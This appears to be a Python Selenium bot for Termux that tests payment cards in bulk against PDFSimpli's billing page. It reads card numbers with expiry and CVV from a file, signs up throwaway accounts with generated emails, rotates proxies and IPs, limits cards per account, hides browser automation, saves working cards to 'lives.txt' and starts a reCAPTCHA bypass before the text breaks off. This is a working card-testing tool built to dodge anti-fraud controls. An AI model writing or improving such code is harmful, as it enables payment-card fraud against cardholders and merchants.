# bot_pdf_simplificado_termux_auto_cuentas.py
import sys
import os
import time
import random
import traceback
import json
import requests
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.firefox.options import Options
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.ui import Select
from selenium.common.exceptions import TimeoutException, NoSuchElementException, ElementClickInterceptedException
from selenium.webdriver.firefox.service import Service

class BotPDFSimpli:
    def __init__(self):
        self.driver = None
        self.wait = None
        # RUTAS ACTUALIZADAS PARA TERMUX - NUEVA RUTA
        termux_home = "/data/data/com.termux/files/home"
        self.ruta_descargas = os.path.join(termux_home, "bot")
        self.ruta_pdf = self.ruta_descargas
        self.archivo_tarjetas = os.path.join(self.ruta_descargas, "tarjetas.txt")
        self.archivo_cuentas = os.path.join(self.ruta_descargas, "cuentas_pdfsimpli.json")
        self.archivo_proxies = os.path.join(self.ruta_descargas, "proxies.txt")
        self.archivo_lives = os.path.join(self.ruta_descargas, "lives.txt")
        self.geckodriver_path = "/data/data/com.termux/files/usr/bin/geckodriver"
        
        print(f"📁 [INIT] Configurando rutas para Termux...")
        print(f"📁 [INIT] Ruta descargas: {self.ruta_descargas}")
        
        # Crear directorio si no existe
        if not os.path.exists(self.ruta_descargas):
            print(f"📁 [INIT] Creando directorio: {self.ruta_descargas}")
            os.makedirs(self.ruta_descargas, exist_ok=True)
        
        # Control de cuentas y límites
        self.cuentas = []
        self.cuenta_actual_index = 0
        self.tarjetas_procesadas_en_cuenta_actual = 0
        self.max_tarjetas_por_cuenta = 3
        
        # Sistema de proxies
        self.proxies = []
        self.proxy_actual = None
        self.ip_actual = None
        
        print("🔄 [INIT] Cargando proxies...")
        self.cargar_proxies()
        
        print("🔄 [INIT] Cargando/generando cuentas...")
        self.cargar_o_generar_cuentas()
        
        print("✅ [INIT] Bot inicializado correctamente")
        
    def obtener_ip_actual(self):
        """Obtener la IP actual del navegador - VERSIÓN ULTRA RÁPIDA"""
        print("🌐 [IP] Obteniendo IP actual...")
        try:
            servicios_ip = ["https://api.ipify.org?format=text"]
            
            for servicio in servicios_ip:
                try:
                    print(f"🌐 [IP] Consultando servicio: {servicio}")
                    self.driver.get(servicio)
                    time.sleep(1)
                    
                    if "ipify" in servicio:
                        ip_element = self.driver.find_element(By.TAG_NAME, "body")
                        ip = ip_element.text.strip()
                        if ip and len(ip) > 7 and '.' in ip:
                            self.ip_actual = ip
                            print(f"✅ [IP] IP actual: {ip}")
                            return ip
                        else:
                            print("❌ [IP] No se pudo obtener IP válida")
                except Exception as e:
                    print(f"❌ [IP] Error consultando {servicio}: {e}")
                    continue
            
            print("❌ [IP] No se pudo obtener IP de ningún servicio")
            return None
            
        except Exception as e:
            print(f"❌ [IP] Error general obteniendo IP: {e}")
            return None

    def cambio_ip_manual_obligatorio(self, ip_anterior):
        """Cambio manual obligatorio de IP - VERSIÓN RÁPIDA"""
        print(f"\n🔒 [IP] INICIANDO CAMBIO MANUAL DE IP OBLIGATORIO")
        print(f"🔒 [IP] IP anterior: {ip_anterior}")
        
        intentos = 0
        while intentos < 60:
            print(f"🔒 [IP] Intento {intentos + 1}/60 - Esperando cambio manual de IP...")
            nueva_ip = self.obtener_ip_actual()
            
            if nueva_ip and nueva_ip != ip_anterior:
                print(f"🎉 [IP] IP CAMBIADA: {ip_anterior} -> {nueva_ip}")
                return True
            else:
                time.sleep(3)
                intentos += 1
        
        print("❌ [IP] Tiempo agotado para cambio manual de IP")
        return False

    def forzar_cambio_ip_cada_6_tarjetas(self, ip_anterior, cuenta_actual, cuentas_usadas_en_esta_ip):
        """Forzar cambio de IP cada 6 tarjetas - VERSIÓN RÁPIDA"""
        print(f"\n🔄 [IP] FORZANDO CAMBIO DE IP CADA 6 TARJETAS")
        print(f"🔄 [IP] IP anterior: {ip_anterior}")
        print(f"🔄 [IP] Cuentas usadas en esta IP: {cuentas_usadas_en_esta_ip}")
        
        if self.proxies:
            print("🔄 [IP] Intentando cambio de IP con proxies...")
            proxy = self.obtener_proxy_aleatorio()
            print(f"🔄 [IP] Proxy seleccionado: {proxy}")
            
            if proxy and self.configurar_navegador_con_proxy(proxy):
                self.proxy_actual = proxy
                
                if self.verificar_cambio_ip(ip_anterior, max_intentos=3):
                    nueva_cuenta = self.obtener_proxima_cuenta()
                    if nueva_cuenta:
                        print("✅ [IP] Cambio de IP exitoso con proxy")
                        return nueva_cuenta, 1, self.ip_actual
                else:
                    print("❌ [IP] Falló cambio de IP con proxy")
        
        print("🔄 [IP] Intentando cambio manual de IP...")
        if self.cambio_ip_manual_obligatorio(ip_anterior):
            if self.configurar_navegador_sin_proxy():
                nueva_cuenta = self.obtener_proxima_cuenta()
                if nueva_cuenta:
                    print("✅ [IP] Cambio de IP manual exitoso")
                    return nueva_cuenta, 1, self.ip_actual
            else:
                print("❌ [IP] Error configurando navegador sin proxy")
        else:
            print("❌ [IP] Falló cambio manual de IP")
        
        print("❌ [IP] No se pudo cambiar la IP")
        return None, cuentas_usadas_en_esta_ip, ip_anterior

    def verificar_cambio_ip(self, ip_anterior, max_intentos=5):
        """Verificar que la IP ha cambiado - VERSIÓN RÁPIDA"""
        print(f"🔍 [IP] Verificando cambio de IP: {ip_anterior} -> ?")
        intentos = 0
        while intentos < max_intentos:
            try:
                print(f"🔍 [IP] Intento {intentos + 1}/{max_intentos}")
                ip_actual = self.obtener_ip_actual()
                
                if not ip_actual:
                    print(f"🔍 [IP] No se pudo obtener IP en intento {intentos + 1}")
                    intentos += 1
                    time.sleep(2)
                    continue
                
                if ip_actual != ip_anterior:
                    print(f"✅ [IP] IP cambiada correctamente: {ip_anterior} -> {ip_actual}")
                    return True
                else:
                    print(f"🔍 [IP] IP aún no ha cambiado: {ip_actual}")
                    if self.proxies:
                        print("🔄 [IP] Cambiando proxy...")
                        proxy = self.obtener_proxy_aleatorio()
                        
                        if self.driver:
                            self.driver.quit()
                        
                        if self.configurar_navegador_con_proxy(proxy):
                            self.proxy_actual = proxy
                            print(f"✅ [IP] Proxy cambiado: {proxy}")
                        else:
                            print("❌ [IP] Error configurando proxy, intentando sin proxy...")
                            if not self.configurar_navegador_sin_proxy():
                                return False
                    
                    intentos += 1
                    time.sleep(3)
                    
            except Exception as e:
                print(f"❌ [IP] Error verificando cambio IP: {e}")
                intentos += 1
                time.sleep(2)
        
        print("❌ [IP] No se verificó el cambio de IP después de todos los intentos")
        return False

    def cambiar_cuenta_con_verificacion_ip(self):
        """Cambiar de cuenta con verificación obligatoria de IP - VERSIÓN RÁPIDA"""
        print("🔄 [CUENTA] Cambiando cuenta con verificación de IP...")
        
        ip_anterior = None
        for intento in range(2):
            print(f"🔍 [CUENTA] Obteniendo IP anterior (intento {intento + 1})...")
            ip_anterior = self.obtener_ip_actual()
            if ip_anterior:
                break
            time.sleep(1)
        
        if not ip_anterior:
            print("⚠️ [CUENTA] No se pudo obtener IP anterior, continuando...")
            return self.obtener_proxima_cuenta()
        
        print(f"🔍 [CUENTA] IP anterior: {ip_anterior}")
        
        if self.driver:
            print("🔄 [CUENTA] Cerrando navegador actual...")
            self.driver.quit()
        
        print("🔄 [CUENTA] Obteniendo nueva cuenta...")
        nueva_cuenta = self.obtener_proxima_cuenta()
        if not nueva_cuenta:
            print("❌ [CUENTA] No hay cuentas disponibles")
            return None
        
        print(f"✅ [CUENTA] Nueva cuenta obtenida: {nueva_cuenta['email'][:15]}...")
        
        proxy = self.obtener_proxy_aleatorio()
        if proxy and self.configurar_navegador_con_proxy(proxy):
            self.proxy_actual = proxy
            print(f"✅ [CUENTA] Navegador configurado con proxy: {proxy}")
        else:
            print("🔄 [CUENTA] Configurando navegador sin proxy...")
            if not self.configurar_navegador_sin_proxy():
                print("❌ [CUENTA] Error configurando navegador sin proxy")
                return None
        
        print("🔍 [CUENTA] Verificando cambio de IP...")
        if not self.verificar_cambio_ip(ip_anterior, max_intentos=3):
            print("❌ [CUENTA] No se verificó el cambio de IP")
            return None
        
        print("✅ [CUENTA] Cambio de cuenta con verificación de IP completado")
        return nueva_cuenta

    def cambiar_cuenta_sin_cambiar_ip(self):
        """Cambiar de cuenta manteniendo la misma IP - VERSIÓN RÁPIDA"""
        print("🔄 [CUENTA] Cambiando cuenta sin cambiar IP...")
        proxy_actual = self.proxy_actual
        print(f"🔍 [CUENTA] Proxy actual: {proxy_actual}")
        
        if self.driver:
            print("🔄 [CUENTA] Cerrando navegador actual...")
            self.driver.quit()
        
        print("🔄 [CUENTA] Obteniendo nueva cuenta...")
        nueva_cuenta = self.obtener_proxima_cuenta()
        if not nueva_cuenta:
            print("❌ [CUENTA] No hay cuentas disponibles")
            return None
        
        print(f"✅ [CUENTA] Nueva cuenta obtenida: {nueva_cuenta['email'][:15]}...")
        
        if proxy_actual and self.configurar_navegador_con_proxy(proxy_actual):
            print(f"✅ [CUENTA] Navegador configurado con mismo proxy")
            pass
        else:
            print("🔄 [CUENTA] Configurando navegador sin proxy...")
            if not self.configurar_navegador_sin_proxy():
                print("❌ [CUENTA] Error configurando navegador sin proxy")
                return None
        
        print("✅ [CUENTA] Cambio de cuenta sin cambiar IP completado")
        return nueva_cuenta
        
    def generar_nombre_aleatorio(self):
        """Generar nombre aleatorio para la tarjeta"""
        nombres = ["Juan", "Maria", "Carlos", "Ana", "Luis", "Laura", "Miguel", "Isabel", 
                  "Jose", "Patricia", "Francisco", "Elena", "Antonio", "Carmen", "Manuel"]
        apellidos = ["Garcia", "Rodriguez", "Gonzalez", "Fernandez", "Lopez", "Martinez", 
                    "Sanchez", "Perez", "Gomez", "Martin", "Jimenez", "Ruiz", "Hernandez"]
        
        nombre = random.choice(nombres)
        apellido = random.choice(apellidos)
        nombre_completo = f"{nombre} {apellido}"
        print(f"👤 [NOMBRE] Generado: {nombre_completo}")
        return nombre_completo
        
    def guardar_tarjeta_valida(self, tarjeta):
        """Guardar tarjeta válida en archivo lives.txt"""
        try:
            with open(self.archivo_lives, "a", encoding="utf-8") as f:
                linea = f"{tarjeta['numero']}|{tarjeta['mes']}|{tarjeta['anio']}|{tarjeta['cvv']}\n"
                f.write(linea)
            print(f"\033[92m💾 [TARJETA] TARJETA VÁLIDA GUARDADA: {tarjeta['numero']}\033[0m")
            return True
        except Exception as e:
            print(f"❌ [TARJETA] Error guardando tarjeta válida: {e}")
            return False

    def eliminar_tarjeta_del_archivo(self, tarjeta):
        """Eliminar tarjeta procesada del archivo tarjetas.txt"""
        try:
            if not os.path.exists(self.archivo_tarjetas):
                print("⚠️ [TARJETA] Archivo de tarjetas no existe")
                return False
                
            with open(self.archivo_tarjetas, 'r', encoding='utf-8') as f:
                lineas = f.readlines()
            
            nueva_lineas = []
            tarjeta_encontrada = False
            tarjeta_str = f"{tarjeta['numero']}|{tarjeta['mes']}|{tarjeta['anio']}|{tarjeta['cvv']}"
            
            for linea in lineas:
                linea_limpia = linea.strip()
                if linea_limpia and not linea_limpia.startswith('#'):
                    if linea_limpia == tarjeta_str and not tarjeta_encontrada:
                        tarjeta_encontrada = True
                        print(f"🗑️  [TARJETA] Eliminando tarjeta del archivo: {tarjeta['numero'][:8]}...")
                        continue
                nueva_lineas.append(linea)
            
            if tarjeta_encontrada:
                with open(self.archivo_tarjetas, 'w', encoding='utf-8') as f:
                    f.writelines(nueva_lineas)
                print(f"✅ [TARJETA] Tarjeta eliminada del archivo: {tarjeta['numero'][:8]}...")
                return True
            else:
                print("⚠️ [TARJETA] Tarjeta no encontrada en archivo")
                return False
            
        except Exception as e:
            print(f"❌ [TARJETA] Error eliminando tarjeta del archivo: {e}")
            return False

    def verificar_resultado_tarjeta(self, numero_tarjeta, tarjeta_actual=None):
        """Verificar resultado por URL de confirmación - VERSIÓN CON 10 SEGUNDOS"""
        print("🔍 [VERIFICACIÓN] Iniciando verificación de resultado...")
        try:
            print("⏳ [VERIFICACIÓN] Esperando 10 segundos para detectar confirmación...")
            time.sleep(10)
            
            current_url = self.driver.current_url
            print(f"🔗 [VERIFICACIÓN] URL actual: {current_url}")
            
            if "pdfsimpli.com/app/billing/confirmation" in current_url:
                print("✅ ✅ ✅ [VERIFICACIÓN] PAGO EXITOSO DETECTADO POR URL - Tarjeta VÁLIDA")
                if tarjeta_actual:
                    self.guardar_tarjeta_valida(tarjeta_actual)
                return True
            
            indicadores_exito = [
                (By.XPATH, "//*[contains(text(), 'Payment successful')]"),
                (By.XPATH, "//*[contains(text(), 'payment successful')]"),
                (By.XPATH, "//*[contains(text(), 'Payment Successful')]"),
                (By.XPATH, "//*[contains(text(), 'Pago exitoso')]"),
                (By.XPATH, "//*[contains(text(), 'pago exitoso')]"),
                (By.XPATH, "//*[contains(text(), 'Thank you')]"),
                (By.XPATH, "//*[contains(text(), 'thank you')]"),
            ]
            
            for i, selector in enumerate(indicadores_exito):
                try:
                    print(f"🔍 [VERIFICACIÓN] Buscando indicador {i+1}/{len(indicadores_exito)}...")
                    elemento_exito = WebDriverWait(self.driver, 3).until(
                        EC.presence_of_element_located(selector)
                    )
                    if elemento_exito and elemento_exito.is_displayed():
                        print("✅ ✅ ✅ [VERIFICACIÓN] PAGO EXITOSO DETECTADO - Tarjeta VÁLIDA")
                        if tarjeta_actual:
                            self.guardar_tarjeta_valida(tarjeta_actual)
                        return True
                except Exception as e:
                    print(f"⚠️ [VERIFICACIÓN] Indicador {i+1} no encontrado: {e}")
                    continue
            
            try:
                print("🔍 [VERIFICACIÓN] Analizando código fuente de la página...")
                page_source = self.driver.page_source.lower()
                terminos_exito = ['payment successful', 'pago exitoso', 'thank you', 'transaction completed']
                
                for termino in terminos_exito:
                    if termino in page_source:
                        print(f"✅ ✅ ✅ [VERIFICACIÓN] PAGO EXITOSO EN PÁGINA ('{termino}') - Tarjeta VÁLIDA")
                        if tarjeta_actual:
                            self.guardar_tarjeta_valida(tarjeta_actual)
                        return True
            except Exception as e:
                print(f"⚠️ [VERIFICACIÓN] Error analizando page source: {e}")
            
            print("🔍 [VERIFICACIÓN] Buscando botón Close...")
            selectores_boton_close = [
                (By.XPATH, "//button[contains(@class, 'bg-ps-reskin-radial') and contains(text(), 'Close')]"),
                (By.XPATH, "//button[contains(@class, 'bg-ps-reskin-radial')]"),
                (By.XPATH, "//button[contains(text(), 'Close')]"),
            ]
            
            close_encontrado = False
            for i, selector in enumerate(selectores_boton_close):
                try:
                    print(f"🔍 [VERIFICACIÓN] Buscando botón Close {i+1}/{len(selectores_boton_close)}...")
                    boton_close = WebDriverWait(self.driver, 3).until(
                        EC.visibility_of_element_located(selector)
                    )
                    if boton_close and boton_close.is_displayed():
                        print("❌ [VERIFICACIÓN] Botón Close VISIBLE detectado - Tarjeta NO válida")
                        self.driver.execute_script("arguments[0].click();", boton_close)
                        time.sleep(2)
                        close_encontrado = True
                        break
                except Exception as e:
                    print(f"⚠️ [VERIFICACIÓN] Botón Close {i+1} no encontrado: {e}")
                    continue
            
            if close_encontrado:
                return False
            
            print("🔍 [VERIFICACIÓN] Buscando indicadores de error...")
            indicadores_error = [
                (By.XPATH, "//*[contains(text(), 'declined')]"),
                (By.XPATH, "//*[contains(text(), 'error')]"),
                (By.XPATH, "//*[contains(text(), 'invalid')]"),
            ]
            
            for i, selector in enumerate(indicadores_error):
                try:
                    print(f"🔍 [VERIFICACIÓN] Buscando indicador error {i+1}/{len(indicadores_error)}...")
                    elemento_error = WebDriverWait(self.driver, 2).until(
                        EC.presence_of_element_located(selector)
                    )
                    if elemento_error and elemento_error.is_displayed():
                        print("❌ [VERIFICACIÓN] Error detectado en página - Tarjeta NO válida")
                        return False
                except Exception as e:
                    print(f"⚠️ [VERIFICACIÓN] Indicador error {i+1} no encontrado: {e}")
                    continue
            
            print("❌ [VERIFICACIÓN] No se detectó confirmación de pago después de 10 segundos - Tarjeta NO válida")
            return False
                
        except Exception as e:
            print(f"❌ [VERIFICACIÓN] Error verificando resultado: {e}")
            return False

    def limpiar_pagina_despues_de_error(self):
        """Limpiar la página después de un error - VERSIÓN RÁPIDA"""
        print("🔄 [LIMPIEZA] Limpiando página después de error...")
        try:
            current_url = self.driver.current_url
            print(f"🔗 [LIMPIEZA] URL actual: {current_url}")
            
            if "pdfsimpli.com/app/billing/confirmation" in current_url:
                print("✅ [LIMPIEZA] Ya está en página de confirmación")
                return True
            
            print("🔄 [LIMPIEZA] Cerrando botón Close si existe...")
            self.cerrar_boton_close_despues_de_error()
            time.sleep(1)
            
            if self.verificar_pagina_pago():
                print("✅ [LIMPIEZA] Página de pago verificada después de limpieza")
                return True
            else:
                print("🔄 [LIMPIEZA] Recargando página...")
                self.driver.refresh()
                time.sleep(3)
                
                if self.verificar_pagina_pago():
                    print("✅ [LIMPIEZA] Página de pago verificada después de recarga")
                    return True
                else:
                    print("❌ [LIMPIEZA] No se pudo restaurar página de pago")
                    return False
                    
        except Exception as e:
            print(f"❌ [LIMPIEZA] Error limpiando página: {e}")
            return False

    def cerrar_boton_close_despues_de_error(self):
        """Cerrar botón Close DESPUÉS de error de tarjeta - FUNCIÓN CORREGIDA"""
        print("🔍 [CLOSE] Buscando botón Close después de error de tarjeta...")
        try:
            selectores_boton_close = [
                (By.XPATH, "//button[contains(@class, 'bg-ps-reskin-radial') and contains(text(), 'Close')]"),
                (By.XPATH, "//button[contains(@class, 'bg-ps-reskin-radial')]"),
                (By.XPATH, "//button[contains(text(), 'Close')]"),
            ]
            
            for i, selector in enumerate(selectores_boton_close):
                try:
                    print(f"🔍 [CLOSE] Intentando selector {i+1}/{len(selectores_boton_close)}...")
                    boton_close = WebDriverWait(self.driver, 3).until(
                        EC.element_to_be_clickable(selector)
                    )
                    if boton_close and boton_close.is_displayed():
                        print("🔴 [CLOSE] Botón Close detectado - CERRANDO después de error")
                        self.driver.execute_script("arguments[0].click();", boton_close)
                        time.sleep(2)
                        print("✅ [CLOSE] Botón Close cerrado correctamente")
                        return True
                except Exception as e:
                    print(f"⚠️ [CLOSE] Selector {i+1} no funcionó: {e}")
                    continue
            
            print("✅ [CLOSE] No se encontró botón Close después del error")
            return False
            
        except Exception as e:
            print(f"⚠️ [CLOSE] Error buscando botón Close después de error: {e}")
            return False

    def cargar_proxies(self):
        """Cargar lista de proxies desde archivo"""
        print("📁 [PROXIES] Cargando proxies...")
        try:
            if os.path.exists(self.archivo_proxies):
                with open(self.archivo_proxies, 'r', encoding='utf-8') as f:
                    lineas = f.readlines()
                    proxies_cargados = 0
                    for linea in lineas:
                        linea = linea.strip()
                        if linea and not linea.startswith('#'):
                            self.proxies.append(linea)
                            proxies_cargados += 1
                print(f"✅ [PROXIES] {proxies_cargados} proxies cargados")
            else:
                print("⚠️ [PROXIES] Archivo de proxies no existe")
                self.crear_archivo_proxies_ejemplo()
        except Exception as e:
            print(f"❌ [PROXIES] Error cargando proxies: {e}")
    
    def crear_archivo_proxies_ejemplo(self):
        """Crear archivo de ejemplo para proxies"""
        print("📁 [PROXIES] Creando archivo de ejemplo...")
        try:
            with open(self.archivo_proxies, 'w', encoding='utf-8') as f:
                f.write("# Formato: ip:puerto o usuario:contraseña@ip:puerto\n")
                f.write("# Ejemplo: 192.168.1.1:8080\n")
                f.write("# Ejemplo con auth: usuario:contraseña@192.168.1.1:8080\n")
            print("✅ [PROXIES] Archivo de ejemplo creado")
        except Exception as e:
            print(f"❌ [PROXIES] Error creando archivo de ejemplo: {e}")
    
    def obtener_proxy_aleatorio(self):
        """Obtener un proxy aleatorio de la lista"""
        if not self.proxies:
            print("⚠️ [PROXIES] No hay proxies disponibles")
            return None
        proxy = random.choice(self.proxies)
        print(f"🎲 [PROXIES] Proxy aleatorio seleccionado: {proxy}")
        return proxy
    
    def configurar_navegador_con_proxy(self, proxy=None):
        """Configurar navegador Firefox con proxy IGNORANDO SSL"""
        print("🔄 [NAVEGADOR] Configurando Firefox con proxy...")
        try:
            options = Options()
            
            options.set_preference("dom.webdriver.enabled", False)
            options.set_preference('useAutomationExtension', False)
            options.set_preference("browser.privatebrowsing.autostart", True)
            options.set_preference("accept_insecure_certs", True)
            options.set_preference("dom.disable_beforeunload", True)
            options.set_preference("browser.download.folderList", 2)
            options.set_preference("browser.download.dir", self.ruta_descargas)
            options.set_preference("browser.download.useDownloadDir", True)
            options.set_preference("browser.helperApps.neverAsk.saveToDisk", "application/pdf")
            options.set_preference("pdfjs.disabled", True)
            
            if proxy:
                print(f"🔌 [NAVEGADOR] Configurando proxy: {proxy}")
                options.set_preference("network.proxy.type", 1)
                if "@" in proxy:
                    auth, server = proxy.split("@")
                    user, password = auth.split(":")
                    ip, port = server.split(":")
                    
                    options.set_preference("network.proxy.http", ip)
                    options.set_preference("network.proxy.http_port", int(port))
                    options.set_preference("network.proxy.ssl", ip)
                    options.set_preference("network.proxy.ssl_port", int(port))
                    options.set_preference("network.proxy.ftp", ip)
                    options.set_preference("network.proxy.ftp_port", int(port))
                    options.set_preference("network.proxy.socks", ip)
                    options.set_preference("network.proxy.socks_port", int(port))
                    
                    options.set_preference("network.proxy.username", user)
                    options.set_preference("network.proxy.password", password)
                    
                    print(f"🔌 [NAVEGADOR] Proxy con autenticación configurado: {ip}:{port}")
                else:
                    ip, port = proxy.split(":")
                    options.set_preference("network.proxy.http", ip)
                    options.set_preference("network.proxy.http_port", int(port))
                    options.set_preference("network.proxy.ssl", ip)
                    options.set_preference("network.proxy.ssl_port", int(port))
                    options.set_preference("network.proxy.ftp", ip)
                    options.set_preference("network.proxy.ftp_port", int(port))
                    options.set_preference("network.proxy.socks", ip)
                    options.set_preference("network.proxy.socks_port", int(port))
                    
                    print(f"🔌 [NAVEGADOR] Proxy sin autenticación configurado: {ip}:{port}")
            
            print(f"🔧 [NAVEGADOR] Usando geckodriver en: {self.geckodriver_path}")
            service = Service(self.geckodriver_path)
            
            self.driver = webdriver.Firefox(service=service, options=options)
            self.driver.set_page_load_timeout(60)
            self.wait = WebDriverWait(self.driver, 30)
            
            print("✅ [NAVEGADOR] Firefox configurado con proxy - SSL ignorado completamente")
            return True
            
        except Exception as e:
            print(f"❌ [NAVEGADOR] Error configurando Firefox con proxy: {e}")
            return False

    def configurar_navegador_sin_proxy(self):
        """Configurar Firefox sin proxy IGNORANDO SSL"""
        print("🔄 [NAVEGADOR] Configurando Firefox sin proxy...")
        try:
            options = Options()
            
            options.set_preference("dom.webdriver.enabled", False)
            options.set_preference('useAutomationExtension', False)
            options.set_preference("browser.privatebrowsing.autostart", True)
            options.set_preference("accept_insecure_certs", True)
            options.set_preference("dom.disable_beforeunload", True)
            options.set_preference("browser.download.folderList", 2)
            options.set_preference("browser.download.dir", self.ruta_descargas)
            options.set_preference("browser.download.useDownloadDir", True)
            options.set_preference("browser.helperApps.neverAsk.saveToDisk", "application/pdf")
            options.set_preference("pdfjs.disabled", True)
            
            print(f"🔧 [NAVEGADOR] Usando geckodriver en: {self.geckodriver_path}")
            service = Service(self.geckodriver_path)
            
            self.driver = webdriver.Firefox(service=service, options=options)
            self.driver.set_page_load_timeout(60)
            self.wait = WebDriverWait(self.driver, 30)
            
            print("✅ [NAVEGADOR] Firefox configurado sin proxy - SSL ignorado completamente")
            return True
            
        except Exception as e:
            print(f"❌ [NAVEGADOR] Error configurando Firefox sin proxy: {e}")
            return False

    def generar_cuenta_aleatoria(self):
        """Generar una cuenta aleatoria individual"""
        nombres = ['juan', 'maria', 'carlos', 'ana', 'luis', 'laura', 'miguel', 'isabel', 
                  'jose', 'patricia', 'francisco', 'elena', 'antonio', 'carmen', 'manuel']
        apellidos = ['garcia', 'rodriguez', 'gonzalez', 'fernandez', 'lopez', 'martinez', 
                    'sanchez', 'perez', 'gomez', 'martin', 'jimenez', 'ruiz', 'hernandez']
        
        nombre = random.choice(nombres)
        apellido = random.choice(apellidos)
        numero = random.randint(10000, 99999)
        dominio = random.choice(['gmail.com', 'outlook.com', 'yahoo.com', 'hotmail.com'])
        
        email = f"{nombre}.{apellido}{numero}@{dominio}"
        password = f"{nombre.capitalize()}{apellido.capitalize()}{random.randint(100, 999)}!"
        
        return {
            "email": email,
            "password": password,
            "usada": False,
            "tarjetas_procesadas": 0,
            "fecha_creacion": time.strftime("%Y-%m-%d %H:%M:%S"),
            "ultimo_uso": None,
            "exitosas": 0,
            "fallidas": 0
        }

    def cargar_o_generar_cuentas(self):
        """Cargar cuentas desde archivo o generarlas si no existen"""
        print("📁 [CUENTAS] Cargando o generando cuentas...")
        try:
            if os.path.exists(self.archivo_cuentas):
                print("📁 [CUENTAS] Cargando cuentas desde archivo...")
                with open(self.archivo_cuentas, 'r', encoding='utf-8') as f:
                    data = json.load(f)
                    self.cuentas = data.get('cuentas', [])
                print(f"✅ [CUENTAS] {len(self.cuentas)} cuentas cargadas desde archivo")
                
                # Si no hay cuentas, generar algunas
                if len(self.cuentas) == 0:
                    print("🔄 [CUENTAS] No hay cuentas en archivo, generando 20 cuentas...")
                    self.generar_cuentas(20)
            else:
                print("🔄 [CUENTAS] Archivo no existe, generando 20 cuentas...")
                self.generar_cuentas(20)
        except Exception as e:
            print(f"❌ [CUENTAS] Error cargando cuentas: {e}")
            print("🔄 [CUENTAS] Generando nuevas cuentas...")
            self.generar_cuentas(20)
    
    def generar_cuentas(self, cantidad=20):
        """Generar lista de cuentas para rotación"""
        print(f"🔄 [CUENTAS] Generando {cantidad} cuentas...")
        
        nuevas_cuentas = []
        for i in range(cantidad):
            nueva_cuenta = self.generar_cuenta_aleatoria()
            nuevas_cuentas.append(nueva_cuenta)
            print(f"📧 [CUENTAS] Cuenta {i+1}/{cantidad}: {nueva_cuenta['email']}")
        
        self.cuentas.extend(nuevas_cuentas)
        self.guardar_cuentas()
        print(f"✅ [CUENTAS] {cantidad} cuentas generadas y guardadas")
    
    def guardar_cuentas(self):
        """Guardar cuentas en archivo JSON"""
        print("💾 [CUENTAS] Guardando cuentas...")
        try:
            data = {
                'cuentas': self.cuentas,
                'ultima_actualizacion': time.strftime("%Y-%m-%d %H:%M:%S"),
                'total_cuentas': len(self.cuentas)
            }
            with open(self.archivo_cuentas, 'w', encoding='utf-8') as f:
                json.dump(data, f, indent=2, ensure_ascii=False)
            print(f"✅ [CUENTAS] {len(self.cuentas)} cuentas guardadas")
        except Exception as e:
            print(f"❌ [CUENTAS] Error guardando cuentas: {e}")
    
    def obtener_proxima_cuenta(self):
        """Obtener la siguiente cuenta disponible - CON GENERACIÓN AUTOMÁTICA"""
        print("🔍 [CUENTAS] Buscando próxima cuenta disponible...")
        
        # Primero buscar cuentas disponibles
        cuentas_disponibles = [c for c in self.cuentas if not c.get('usada', False) or c.get('tarjetas_procesadas', 0) < self.max_tarjetas_por_cuenta]
        
        # Si no hay cuentas disponibles, generar nuevas
        if not cuentas_disponibles:
            print("⚠️ [CUENTAS] No hay cuentas disponibles, generando 10 nuevas...")
            self.generar_cuentas(10)
            # Buscar nuevamente después de generar
            cuentas_disponibles = [c for c in self.cuentas if not c.get('usada', False) or c.get('tarjetas_procesadas', 0) < self.max_tarjetas_por_cuenta]
        
        if not cuentas_disponibles:
            print("❌ [CUENTAS] No hay cuentas disponibles incluso después de generar")
            return None
        
        # Priorizar cuentas no usadas
        cuentas_no_usadas = [c for c in cuentas_disponibles if not c.get('usada', False)]
        if cuentas_no_usadas:
            cuenta = random.choice(cuentas_no_usadas)
            print(f"✅ [CUENTAS] Cuenta nueva seleccionada: {cuenta['email'][:15]}...")
        else:
            cuenta = random.choice(cuentas_disponibles)
            print(f"✅ [CUENTAS] Cuenta reutilizada seleccionada: {cuenta['email'][:15]}... (tarjetas: {cuenta.get('tarjetas_procesadas', 0)})")
        
        self.cuenta_actual_index = self.cuentas.index(cuenta)
        return cuenta
    
    def marcar_cuenta_usada(self, exito=True):
        """Marcar cuenta como usada y actualizar estadísticas"""
        if self.cuenta_actual_index < len(self.cuentas):
            cuenta = self.cuentas[self.cuenta_actual_index]
            cuenta['usada'] = True
            cuenta['ultimo_uso'] = time.strftime("%Y-%m-%d %H:%M:%S")
            
            if exito:
                cuenta['tarjetas_procesadas'] = cuenta.get('tarjetas_procesadas', 0) + 1
                cuenta['exitosas'] = cuenta.get('exitosas', 0) + 1
                print(f"✅ [CUENTAS] Cuenta marcada como exitosa: {cuenta['email'][:15]}... (éxitos: {cuenta['exitosas']})")
            else:
                cuenta['tarjetas_procesadas'] = cuenta.get('tarjetas_procesadas', 0) + 1
                cuenta['fallidas'] = cuenta.get('fallidas', 0) + 1
                print(f"❌ [CUENTAS] Cuenta marcada como fallida: {cuenta['email'][:15]}... (fallos: {cuenta['fallidas']})")
            
            self.guardar_cuentas()

    def verificar_error_registro(self):
        """Verificar si aparece el mensaje de error de registro"""
        print("🔍 [REGISTRO] Verificando errores de registro...")
        try:
            selectores_error = [
                (By.XPATH, "//p[contains(@class, 'text-red-500') and contains(text(), 'Max registration attempt exhausted')]"),
            ]
            
            for selector in selectores_error:
                try:
                    elemento = WebDriverWait(self.driver, 1).until(
                        EC.presence_of_element_located(selector)
                    )
                    if elemento and elemento.is_displayed():
                        print("❌ [REGISTRO] Error de registro detectado: Max registration attempt exhausted")
                        return True
                except:
                    continue
            print("✅ [REGISTRO] No se detectaron errores de registro")
            return False
            
        except Exception as e:
            print(f"⚠️ [REGISTRO] Error verificando errores de registro: {e}")
            return False

    def resolver_recaptcha_automático(self):
        """Resolver automáticamente el reCAPTCHA haciendo clic en el checkbox"""
        print("🔄 [CAPTCHA] Intentando resolver reCAPTCHA automáticamente...")
        try:
            iframes = self.driver.find_elements(By.TAG_NAME, "iframe")
            recaptcha_iframe = None
            
            for iframe in iframes:
                try:
                    src = iframe.get_attribute("src")
                    if src and "google.com/recaptcha" in src:
                        recaptcha_iframe = iframe
                        break
                except:
                    continue
            
            if recaptcha_iframe:
                self.driver.switch_to.frame(recaptcha_iframe)
                
